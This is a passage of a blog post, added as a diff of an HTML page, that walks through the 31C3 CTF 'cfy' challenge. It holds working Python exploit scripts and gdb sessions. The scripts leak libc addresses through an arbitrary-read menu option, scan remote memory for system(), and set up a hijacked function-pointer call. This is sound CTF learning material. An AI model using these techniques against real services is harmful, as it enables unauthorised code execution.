@@ -1,0 +1,826 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>31C3 CTF - Cfy - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at cfy. We&rsquo;re &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">31C3 CTF - Cfy</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-12-29T12:06:07+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3<span class="nv">$ </span>nc 188.40.18.73 3313
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak <code>libc</code> address from the got:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x601020</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>  <span class="c"># printf</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Given us the ouput:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>python read.py
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Please enter your number: dec: 140512731112416
+</span><span class='line'>hex: 0x7fcbab6ca3e0
+</span><span class='line'>
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Unfortunately, running the python script again shows a different output value. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>
+
+<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>  4008af: <span class="m">48</span> c1 e0 <span class="m">04</span>           shl    rax,0x4         <span class="p">;</span> multiply value by 16
+</span><span class='line'>  4008b3: <span class="m">48</span> <span class="m">05</span> <span class="m">80</span> <span class="m">10</span> <span class="m">60</span> <span class="m">00</span>     add    rax,0x601080    <span class="p">;</span> address of parsers, see below
+</span><span class='line'>  4008b9: <span class="m">48</span> 8b <span class="m">00</span>              mov    rax,QWORD PTR <span class="o">[</span>rax<span class="o">]</span>
+</span><span class='line'>  4008bc: bf e0 <span class="m">10</span> <span class="m">60</span> <span class="m">00</span>        mov    edi,0x6010e0    <span class="p">;</span> address of buf, see below
+</span><span class='line'>  4008c1: ff d0                 call   rax             <span class="p">;</span> gain code <span class="nb">exec </span>here!
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p parsers
+</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span> <span class="o">{</span>
+</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x40073d &lt;from_hex&gt;,
+</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009b4 <span class="s2">&quot;parse from hex&quot;</span>
+</span><span class='line'>  <span class="o">}</span>, <span class="o">{</span>
+</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x400761 &lt;from_dec&gt;,
+</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009c3 <span class="s2">&quot;parse from dec&quot;</span>
+</span><span class='line'>  <span class="o">}</span>, <span class="o">{</span>
+</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x400785 &lt;from_ptr&gt;,
+</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009d2 <span class="s2">&quot;parse from pointer&quot;</span>
+</span><span class='line'>  <span class="o">}</span> <span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/40wx parsers
+</span><span class='line'>0x601080 &lt;parsers&gt;:             0x0040073d  0x00000000  0x004009b4  0x00000000
+</span><span class='line'>0x601090 &lt;parsers+16&gt;:          0x00400761  0x00000000  0x004009c3  0x00000000
+</span><span class='line'>0x6010a0 &lt;parsers+32&gt;:          0x00400785  0x00000000  0x004009d2  0x00000000
+</span><span class='line'>0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x6010c0 &lt;stdout@@GLIBC_2.2.5&gt;: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
+</span><span class='line'>0x6010d0 &lt;completed.6972&gt;:      0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x6010e0 &lt;buf&gt;:                 0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x6010f0 &lt;buf+16&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x601100 &lt;buf+32&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x601110 &lt;buf+48&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span><span class='line'>7 <span class="c"># give bigger number!</span>
+</span><span class='line'>
+</span><span class='line'>Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>RAX: 0x6161616161616161 <span class="o">(</span><span class="s1">&#39;aaaaaaaa&#39;</span><span class="o">)</span>
+</span><span class='line'>RBX: 0x0
+</span><span class='line'>RCX: 0xfbad2288
+</span><span class='line'>RDX: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
+</span><span class='line'>RSI: 0x7ffff7ff7035 --&gt; 0x0
+</span><span class='line'>RDI: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
+</span><span class='line'>RBP: 0x7fffffffe4b0 --&gt; 0x0
+</span><span class='line'>RSP: 0x7fffffffe4a0 --&gt; 0x7ffffe590
+</span><span class='line'>...snip...
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>   0x4008b3 &lt;main+167&gt;: add    rax,0x601080
+</span><span class='line'>   0x4008b9 &lt;main+173&gt;: mov    rax,QWORD PTR <span class="o">[</span>rax<span class="o">]</span>
+</span><span class='line'>   0x4008bc &lt;main+176&gt;: mov    edi,0x6010e0
+</span><span class='line'><span class="o">=</span>&gt; 0x4008c1 &lt;main+181&gt;: call   rax
+</span><span class='line'>   0x4008c3 &lt;main+183&gt;: mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
+</span><span class='line'>   0x4008c7 &lt;main+187&gt;: mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
+</span><span class='line'>   0x4008cb &lt;main+191&gt;: mov    rsi,rax
+</span><span class='line'>   0x4008ce &lt;main+194&gt;: mov    edi,0x400a3d
+</span><span class='line'>Guessed arguments:
+</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
+</span><span class='line'>..snip...
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x00000000004008c1 in main <span class="o">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>
+
+<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>gdb ./libc-2.19.so
+</span><span class='line'>GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
+</span><span class='line'>...snip...
+</span><span class='line'>gdb-peda<span class="nv">$ </span>x/8b system
+</span><span class='line'>0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="p">)</span> <span class="c"># printf</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1025</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.5</span><span class="p">)</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">PRINTF</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+</span><span class='line'><span class="k">print</span> <span class="n">data</span>
+</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;hex: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">PRINTF</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">OFFSET</span><span class="o">=</span><span class="mi">63580</span>    <span class="c"># guesstimated from real libc</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5000</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
+</span><span class='line'>  <span class="k">print</span> <span class="n">i</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;ff85&#39;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span> <span class="c"># part of test rdi, rdi</span>
+</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] found possible offset for system(): printf-</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">))</span>
+</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] system @ </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>          <span class="nb">raw_input</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
+</span><span class='line'><span class="mi">85</span>
+</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">possible</span> <span class="n">offset</span> <span class="k">for</span> <span class="n">system</span><span class="p">():</span> <span class="n">printf</span><span class="o">-</span><span class="mi">63665</span>
+</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0x7f4df0086b2f</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">number</span><span class="p">:</span> <span class="n">dec</span><span class="p">:</span> <span class="mi">2803784840145881088</span>
+</span><span class='line'><span class="nb">hex</span><span class="p">:</span> <span class="mh">0x26e90b74ff854800</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">What</span> <span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">do</span><span class="err">?</span>
+</span><span class='line'><span class="mi">0</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">hex</span>
+</span><span class='line'><span class="mi">1</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">dec</span>
+</span><span class='line'><span class="mi">2</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">pointer</span>
+</span><span class='line'><span class="mi">3</span><span class="p">)</span> <span class="n">quit</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">86</span>
